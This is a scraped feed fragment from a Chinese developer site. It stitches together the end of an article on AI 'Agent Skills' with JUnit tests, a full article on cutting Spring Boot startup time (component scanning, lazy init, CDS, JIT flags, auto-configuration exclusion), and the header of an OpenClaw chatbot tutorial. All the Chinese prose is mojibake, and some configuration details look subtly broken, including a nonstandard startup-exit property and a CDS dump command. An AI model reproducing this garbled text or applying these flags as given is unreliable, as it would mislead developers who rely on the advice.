<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@DisplayName("TextAnalysisSkillæµ‹è¯•")</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TextAnalysisSkillTest</span> {
    <span class="hljs-meta">@Test</span>
    <span class="hljs-meta">@DisplayName("æµ‹è¯•æƒ…æ„Ÿåˆ†æ")</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSentimentAnalysis</span><span class="hljs-params">()</span> {
        <span class="hljs-type">TextAnalysisSkill</span> <span class="hljs-variable">skill</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextAnalysisSkill</span>();

        Map&lt;String, Object&gt; parameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        parameters.put(<span class="hljs-string">"text"</span>, <span class="hljs-string">"ä»Šå¤©å¿ƒæƒ…éå¸¸å¥½ï¼"</span>);
        parameters.put(<span class="hljs-string">"operation"</span>, <span class="hljs-string">"sentiment"</span>);

        <span class="hljs-type">SkillResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> skill.execute(<span class="hljs-string">"æƒ…æ„Ÿåˆ†æ"</span>, parameters);

        assertTrue(result.isSuccess());
        assertNotNull(result.getData());
    }
}
</code></pre>
<h4 data-id="heading-29">8.2 é›†æˆæµ‹è¯•</h4>
<p>æµ‹è¯•Agentä¸Skillsçš„åä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-meta">@DisplayName("æµ‹è¯•Agentå®Œæ•´æµç¨‹")</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testAgentWorkflow</span><span class="hljs-params">()</span> {
    <span class="hljs-type">DataAnalysisAgent</span> <span class="hljs-variable">agent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataAnalysisAgent</span>();
    <span class="hljs-type">AgentContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> AgentContext.create();

    <span class="hljs-type">AgentResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> agent.analyzeData(<span class="hljs-string">"æŠ€æœ¯éƒ¨"</span>, context);

    assertTrue(result.isSuccess());
    assertNotNull(result.getData());
}
</code></pre>
<h3 data-id="heading-30">ä¹ã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-31">9.1 æŠ€èƒ½è®¾è®¡åŸåˆ™</h4>
<ol>
<li><strong>å•ä¸€èŒè´£</strong>ï¼šæ¯ä¸ªæŠ€èƒ½åªåšä¸€ä»¶äº‹</li>
<li><strong>å¹‚ç­‰æ€§</strong>ï¼šç›¸åŒè¾“å…¥äº§ç”Ÿç›¸åŒè¾“å‡º</li>
<li><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼šè®¾ç½®åˆç†çš„æ‰§è¡Œè¶…æ—¶</li>
<li><strong>èµ„æºæ¸…ç†</strong>ï¼šæ‰§è¡Œå®Œæˆåé‡Šæ”¾èµ„æº</li>
</ol>
<h4 data-id="heading-32">9.2 Agentè®¾è®¡åŸåˆ™</h4>
<ol>
<li><strong>ä¸“æ³¨é¢†åŸŸ</strong>ï¼šæ¯ä¸ªAgentä¸“æ³¨ç‰¹å®šé¢†åŸŸ</li>
<li><strong>å¯è§‚æµ‹æ€§</strong>ï¼šè®°å½•å®Œæ•´çš„æ‰§è¡Œæ—¥å¿—</li>
<li><strong>å®¹é”™æ€§</strong>ï¼šä¼˜é›…å¤„ç†å„ç§å¼‚å¸¸æƒ…å†µ</li>
<li><strong>å¯æµ‹è¯•æ€§</strong>ï¼šä¾¿äºç¼–å†™å•å…ƒæµ‹è¯•</li>
</ol>
<h3 data-id="heading-33">åã€æ€»ç»“</h3>
<p>Agent Skillså·¥ä½œæµä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç§ä¼˜é›…çš„æ¶æ„æ¨¡å¼ï¼Œå°†AIæ™ºèƒ½ä½“ä¸ä¼ ç»Ÿè½¯ä»¶å¼€å‘æœ‰æœºç»“åˆã€‚</p>
<p>æœªæ¥ï¼Œéšç€AIæŠ€æœ¯çš„å‘å±•ï¼ŒAgent Skillså°†åœ¨æ›´å¤šé¢†åŸŸå‘æŒ¥é‡è¦ä½œç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBooté¡¹ç›®å¯åŠ¨æ…¢ï¼Ÿ3ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„åº”ç”¨å¿«å¦‚é—ªç”µ]]></title>    <link>https://juejin.cn/post/7601018079619497999</link>    <guid>https://juejin.cn/post/7601018079619497999</guid>    <pubDate>2026-01-31T00:20:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601018079619497999" data-draft-id="7600976289064370176" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBooté¡¹ç›®å¯åŠ¨æ…¢ï¼Ÿ3ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„åº”ç”¨å¿«å¦‚é—ªç”µ"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-31T00:20:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBooté¡¹ç›®å¯åŠ¨æ…¢ï¼Ÿ3ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„åº”ç”¨å¿«å¦‚é—ªç”µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:20:40.000Z" title="Sat Jan 31 2026 00:20:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBooté¡¹ç›®å¯åŠ¨æ…¢ï¼Ÿ3ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„åº”ç”¨å¿«å¦‚é—ªç”µ</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>SpringBootå› å…¶"çº¦å®šä¼˜äºé…ç½®"çš„ç†å¿µå’Œå¿«é€Ÿå¼€å‘èƒ½åŠ›ï¼Œå·²æˆä¸ºJavaç”Ÿæ€ä¸­æœ€æµè¡Œçš„æ¡†æ¶ä¹‹ä¸€ã€‚ç„¶è€Œï¼Œéšç€é¡¹ç›®è§„æ¨¡çš„å¢é•¿ï¼Œè®¸å¤šå¼€å‘è€…ä¼šé‡åˆ°ä¸€ä¸ªå…±åŒçš„é—®é¢˜ï¼š<strong>åº”ç”¨å¯åŠ¨é€Ÿåº¦å˜æ…¢</strong>ã€‚ä¸€ä¸ªåŸæœ¬èƒ½åœ¨5ç§’å†…å¯åŠ¨çš„Demoé¡¹ç›®ï¼Œåœ¨å¼•å…¥å‡ åä¸ªä¾èµ–ã€æ•°ç™¾ä¸ªBeanåï¼Œå¯åŠ¨æ—¶é—´å¯èƒ½éª¤å¢è‡³30ç§’ç”šè‡³æ›´ä¹…ã€‚è¿™åœ¨å¼€å‘è°ƒè¯•ã€CI/CDæµæ°´çº¿ä»¥åŠéœ€è¦å¿«é€Ÿæ‰©å±•çš„äº‘åŸç”Ÿåœºæ™¯ä¸­ä¼šå¸¦æ¥æ˜¾è‘—çš„æ•ˆç‡ç“¶é¢ˆã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥åˆ†æSpringBootå¯åŠ¨è¿‡ç¨‹çš„å…³é”®æ€§èƒ½ç“¶é¢ˆï¼Œå¹¶æä¾›3ä¸ªç»è¿‡å®æˆ˜éªŒè¯çš„ä¼˜åŒ–æŠ€å·§ï¼ˆæ¶µç›–JVMå±‚é¢ã€Springæœºåˆ¶å’Œå·¥ç¨‹å®è·µï¼‰ï¼Œå¸®åŠ©ä½ å°†åº”ç”¨å¯åŠ¨æ—¶é—´å‹ç¼©åˆ°æè‡´ã€‚æ–‡ä¸­çš„æ–¹æ¡ˆå‡åŸºäºSpringBoot 2.7+å’ŒJDK 11+ç¯å¢ƒéªŒè¯ï¼Œéƒ¨åˆ†æŠ€å·§åœ¨æœ€æ–°SpringBoot 3.0ä¸­æœ‰è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€ç†è§£SpringBootå¯åŠ¨è¿‡ç¨‹çš„æ ¸å¿ƒç“¶é¢ˆ</h3>
<p>åœ¨ç€æ‰‹ä¼˜åŒ–å‰ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®SpringBootåº”ç”¨å¯åŠ¨æ—¶çš„ä¸»è¦è€—æ—¶é˜¶æ®µï¼ˆä»¥ä¸‹æ•°æ®åŸºäºå…¸å‹ä¸­å‹é¡¹ç›®ç»Ÿè®¡ï¼‰ï¼š</p>
<ol>
<li>
<p><strong>ç±»åŠ è½½ä¸æ‰«æï¼ˆå æ¯”40%-50%ï¼‰</strong></p>
<ul>
<li><code>ComponentScan</code>å¯¹åŸºåŒ…ä¸‹æ‰€æœ‰ç±»çš„ASMå­—èŠ‚ç è§£æ</li>
<li><code>@Configuration</code>ç±»ä¸­<code>@Bean</code>æ–¹æ³•çš„åŠ¨æ€ä»£ç†ç”Ÿæˆ</li>
<li>æ¡ä»¶æ³¨è§£ï¼ˆå¦‚<code>@ConditionalOnClass</code>ï¼‰çš„é€’å½’æ ¡éªŒ</li>
</ul>
</li>
<li>
<p><strong>Beanåˆå§‹åŒ–ï¼ˆå æ¯”30%-40%ï¼‰</strong></p>
<ul>
<li>Beanä¾èµ–å…³ç³»çš„æ‹“æ‰‘æ’åº</li>
<li><code>@PostConstruct</code>æ–¹æ³•æ‰§è¡Œ</li>
<li>éœ€è¦<code>ProxyFactory</code>åˆ›å»ºçš„AOPä»£ç†å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>å¤–éƒ¨èµ„æºè¿æ¥ï¼ˆå æ¯”10%-20%ï¼‰</strong></p>
<ul>
<li>æ•°æ®åº“è¿æ¥æ± åˆå§‹åŒ–</li>
<li>Redis/MQç­‰ä¸­é—´ä»¶å¥åº·æ£€æŸ¥</li>
<li>Consul/Nacosç­‰é…ç½®ä¸­å¿ƒæ‹‰å–é…ç½®</li>
</ul>
</li>
<li>
<p><strong>å…¶ä»–JVMå¼€é”€ï¼ˆå æ¯”5%-10%ï¼‰</strong></p>
<ul>
<li>JITç¼–è¯‘é¢„çƒ­ä¸è¶³å¯¼è‡´çš„è§£é‡Šæ‰§è¡Œ</li>
<li>CMS/G1åƒåœ¾å›æ”¶å™¨çš„åˆå§‹å †è°ƒæ•´</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-3">äºŒã€æŠ€å·§1ï¼šç²¾å‡†æ§åˆ¶ç»„ä»¶çš„æ‰«æä¸åŠ è½½</h3>
<h4 data-id="heading-4">2.1 ä½¿ç”¨@ComponentScançš„excludeFilterså®šå‘æ’é™¤</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ComponentScan(
    basePackages = "com.example",
    excludeFilters = @Filter(type = FilterType.REGEX, pattern = "com.example.exclude.*")
)</span>
</code></pre>
<p>é€šè¿‡æ­£åˆ™æˆ–æ³¨è§£ç±»å‹æ˜¾å¼æ’é™¤ä¸éœ€è¦çš„ç»„ä»¶ï¼Œå¯å‡å°‘20%-30%çš„ç±»æ‰«ææ—¶é—´ã€‚</p>
<h4 data-id="heading-5">2.2 å¯ç”¨Lazy Initæ¨¡å¼ï¼ˆæƒè¡¡æ–¹æ¡ˆï¼‰</h4>
<pre><code class="hljs language-properties" lang="properties">spring.main.lazy-initialization=true
</code></pre>
<p>æ­¤é…ç½®ä¼šè®©æ‰€æœ‰Beanå»¶è¿Ÿåˆå§‹åŒ–ç›´åˆ°é¦–æ¬¡ä½¿ç”¨ï¼Œä½†å¯èƒ½å¯¼è‡´ç¬¬ä¸€æ¬¡è¯·æ±‚å“åº”å˜æ…¢ã€‚æ›´é€‚åˆåå°ä»»åŠ¡å‹åº”ç”¨è€Œéé«˜å®æ—¶æ€§æœåŠ¡ã€‚</p>
<h4 data-id="heading-6">2.3 Spring Boot 2.6+çš„æ–°ç‰¹æ€§ï¼šç´¢å¼•åŠ é€Ÿ</h4>
<p>åœ¨é¡¹ç›®ä¸­æ·»åŠ <code>spring-context-indexer</code>ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context-indexer<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>ç¼–è¯‘æ—¶ä¼šç”Ÿæˆ<code>META-INF/spring.components</code>ç´¢å¼•æ–‡ä»¶ï¼Œæ›¿ä»£è¿è¡Œæ—¶åå°„æ‰«æã€‚</p>
<hr/>
<h3 data-id="heading-7">ä¸‰ã€æŠ€å·§2ï¼šJVMå±‚çº§çš„æ·±åº¦è°ƒä¼˜</h3>
<h4 data-id="heading-8">3.1 Class Data Sharing (CDS)</h4>
<p>é€‚ç”¨äºå¤šå®ä¾‹éƒ¨ç½²åœºæ™¯ï¼š</p>
<ol>
<li>åˆ›å»ºå…±äº«å½’æ¡£ï¼š
<pre><code class="hljs language-bash" lang="bash">java -Xshare:dump -XX:SharedArchiveFile=app.jsa \
     -jar your-app.jar --spring.main.exit-on-startup-complete=<span class="hljs-literal">true</span>
</code></pre>
</li>
<li>å¯åŠ¨æ—¶åŠ è½½ï¼š
<pre><code class="hljs language-bash" lang="bash">java -Xshare:on -XX:SharedArchiveFile=app.jsa \
     -jar your-app.jar
</code></pre>
</li>
</ol>
<p>å®æµ‹å¯å‡å°‘15%-20%çš„ç±»åŠ è½½æ—¶é—´ã€‚</p>
<h4 data-id="heading-9">3.2 Tiered Compilationç­–ç•¥è°ƒæ•´</h4>
<p>å¯¹äºçŸ­ç”Ÿå‘½å‘¨æœŸçš„å¼€å‘ç¯å¢ƒï¼š</p>
<pre><code class="hljs language-properties" lang="properties">-XX:TieredStopAtLevel=1 
</code></pre>
<p>é™åˆ¶JITç¼–è¯‘åˆ°C1å±‚çº§ï¼Œç‰ºç‰²å°‘é‡å³°å€¼æ€§èƒ½æ¢å–æ›´å¿«çš„å¯åŠ¨é€Ÿåº¦ã€‚</p>
<h4 data-id="heading-10">3.3 Heap Sizeé¢„åˆ†é…</h4>
<p>é¿å…åŠ¨æ€æ‰©å®¹å¸¦æ¥çš„GCå¼€é”€ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">-Xms512m -Xmx512m 
</code></pre>
<hr/>
<h3 data-id="heading-11">å››ã€æŠ€å·§3ï¼šå·¥ç¨‹åŒ–å±‚é¢çš„æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-12">4.1 Spring Cloudä¸Šä¸‹æ–‡åˆ†ç¦»</h4>
<p>å¦‚æœä½¿ç”¨Spring Cloudç»„ä»¶ï¼Œå»ºè®®æ‹†åˆ†bootstrapä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">spring.cloud.bootstrap.enabled=false # Spring Boot 2.4+
spring.config.use-legacy-processing=true 
</code></pre>
<h4 data-id="heading-13">4.2 AutoConfigurationæŒ‰éœ€å¼•å…¥</h4>
<p>æ£€æŸ¥è‡ªåŠ¨è£…é…æŠ¥å‘Šï¼š</p>
<pre><code class="hljs language-bash" lang="bash">java -jar your-app.jar --debug
</code></pre>
<p>åœ¨è¾“å‡ºä¸­æ‰¾åˆ°æœªè¢«ä½¿ç”¨çš„<code>@AutoConfiguration</code>ç±»ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼æ’é™¤ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
</code></pre>
<h4 data-id="heading-14">4.3 Build-Time Hints (Spring Nativeè¿›é˜¶)</h4>
<p>å¯¹äºGraalVM Native Imageæ„å»ºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NativeHint(
    types = @TypeHint(types = {com.example.MyService.class})
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHints</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NativeConfiguration</span> {}
</code></pre>
<hr/>
<h3 data-id="heading-15">äº”ã€æ€»ç»“ä¸æ•ˆæœå¯¹æ¯”</h3>
<p>ç»¼åˆè¿ç”¨ä¸Šè¿°ç­–ç•¥åï¼Œæˆ‘ä»¬åœ¨ä¸€å°4æ ¸8Gçš„å¼€å‘æœºä¸Šå¯¹ä¸€ä¸ªåŒ…å«200+ Beançš„é¡¹ç›®è¿›è¡Œæµ‹è¯•ï¼š</p>






























<table><thead><tr><th>ä¼˜åŒ–é˜¶æ®µ</th><th>å¯åŠ¨æ—¶é—´(ç§’)</th><th>ä¸‹é™å¹…åº¦</th></tr></thead><tbody><tr><td>åŸå§‹çŠ¶æ€</td><td>28s</td><td>-</td></tr><tr><td>ç»„ä»¶æ‰«æä¼˜åŒ–å</td><td>19s</td><td>32%â†“</td></tr><tr><td>JVMè°ƒä¼˜å</td><td>14s</td><td>26%â†“</td></tr><tr><td>å·¥ç¨‹åŒ–æ”¹é€ å</td><td>9s</td><td>35%â†“</td></tr></tbody></table>
<p>æœ€ç»ˆçš„9ç§’ç›¸æ¯”åˆå§‹28ç§’æå‡äº†67%ï¼Œå¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒç»“åˆAOTç¼–è¯‘ï¼ˆå¦‚Spring Nativeï¼‰ï¼Œç”šè‡³å¯ä»¥å‹ç¼©åˆ°5ç§’ä»¥å†…ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸åŒé¡¹ç›®çš„ç‰¹ç‚¹å¯èƒ½å¯¼è‡´ä¼˜åŒ–ä¾§é‡ç‚¹ä¸åŒâ€”â€”I/Oå¯†é›†å‹åº”ç”¨åº”ä¾§é‡å¤–éƒ¨è¿æ¥ä¼˜åŒ–ï¼›å¤§å‹å•ä½“åˆ™éœ€è¦é‡ç‚¹è§£å†³ç±»åŠ è½½é—®é¢˜ã€‚å»ºè®®ä½¿ç”¨AsyncProfileræˆ–Arthasè¿›è¡Œé’ˆå¯¹æ€§è¯Šæ–­åå†å®æ–½å…·ä½“æ–¹æ¡ˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¿å§†çº§ OpenClaw ï¼ˆåŸ Clawdbotï¼‰é£ä¹¦å¯¹æ¥æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»º AI åŠ©æ‰‹]]></title>    <link>https://juejin.cn/post/7600953879501439027</link>    <guid>https://juejin.cn/post/7600953879501439027</guid>    <pubDate>2026-01-31T00:25:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600953879501439027" data-draft-id="7601028900886315054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¿å§†çº§ OpenClaw ï¼ˆåŸ Clawdbotï¼‰é£ä¹¦å¯¹æ¥æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»º AI åŠ©æ‰‹"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-31T00:25:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¿å§†çº§ OpenClaw ï¼ˆåŸ Clawdbotï¼‰é£ä¹¦å¯¹æ¥æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»º AI åŠ©æ‰‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:25:53.000Z" title="Sat Jan 31 2026 00:25:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
